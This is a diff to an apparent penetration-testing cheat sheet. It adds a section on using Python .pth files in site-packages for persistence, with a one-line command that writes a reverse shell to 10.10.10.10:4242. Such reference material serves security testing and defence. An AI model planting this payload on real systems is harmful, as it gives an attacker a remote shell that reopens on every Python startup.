@@ -279,6 +279,31 @@ Alternatively you may be able to upload a JSON file with a custom scripts, try t
     }
     ```
 
+#### Python Path File
+
+When a `.pth` file is placed in a directory like `site-packages` or `dist-packages`, Python's `site` initialization logic processes it during interpreter startup.
+
+> An executable line in a .pth file is run at every Python startup, regardless of whether a particular module is actually going to be used. - [Site-specific configuration hook](https://docs.python.org/3/library/site.html)
+
+Dropping a malicious `.pth` file into a globally loaded package directory can give an attacker repeated code execution without modifying the target application's source code. Any Python program that starts in that environment may trigger the payload.
+
+Default locations for globally loaded package directories can be extracted using `python3 -m site`. Typical locations include:
+
+```py
+/usr/lib/pythonX.Y/site-packages/
+/usr/local/lib/pythonX.Y/dist-packages/
+
+# home location
+/root
+/home/$USER
+```
+
+Example of malicious use, this will create a reverse shell that will connect back to the attacker's machine every time a Python process starts in that environment.:
+
+```bash
+echo 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' > /usr/local/lib/python3.6/site-packages/persistence.pth
+```
+
 ### CVE - ImageMagick
 
 If the backend is using ImageMagick to resize/convert user images, you can try to exploit well-known vulnerabilities such as ImageTragik.
@@ -368,6 +393,7 @@ More payloads in the folder `CVE FFmpeg HLS/`.
 ## References
 
 * [A New Vector For “Dirty” Arbitrary File Write to RCE - Doyensec - Maxence Schmitt and Lorenzo Stella - 28 Feb 2023](https://web.archive.org/web/20230228140105/https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
+* [Analysis of Python's .pth files as a persistence mechanism - @malmoeb - January 14, 2025](https://dfir.ch/posts/publish_python_pth_extension/)
 * [Arbitrary File Upload Tricks In Java - pyn3rd - 2022-05-07](https://web.archive.org/web/20220601101409/https://pyn3rd.github.io/2022/05/07/Arbitrary-File-Upload-Tricks-In-Java/)
 * [Attacking Webservers Via .htaccess - Eldar Marcussen - May 17, 2011](https://web.archive.org/web/20200203171034/https://www.justanotherhacker.com:80/2011/05/htaccess-based-attacks.html)
 * [BookFresh Tricky File Upload Bypass to RCE - Ahmed Aboul-Ela - November 29, 2014](http://web.archive.org/web/20141231210005/https://secgeek.net/bookfresh-vulnerability/)
